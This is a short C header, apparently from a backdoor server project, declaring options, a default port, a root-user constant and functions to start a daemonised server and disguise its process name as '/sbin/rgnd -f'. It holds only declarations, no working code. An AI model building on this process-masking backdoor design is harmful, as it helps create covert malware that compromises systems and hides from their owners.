#ifndef BACKDOOR_SERVER_H
#define BACKDOOR_SERVER_H

#include "utils.h"
#include "pktcap.h"

#define MASK_NAME "/sbin/rgnd -f"
#define DEFAULT_PORT 8080
#define TRUE 1
#define FALSE 0
#define USER_ROOT 0

struct options
{
	int daemon_mode;
	int port;

} user_options;

int start_server();
int parse_options(int argc, char **argv);
void print_server_info();
void mask_process(char **argv);
int start_daemon();

#endif
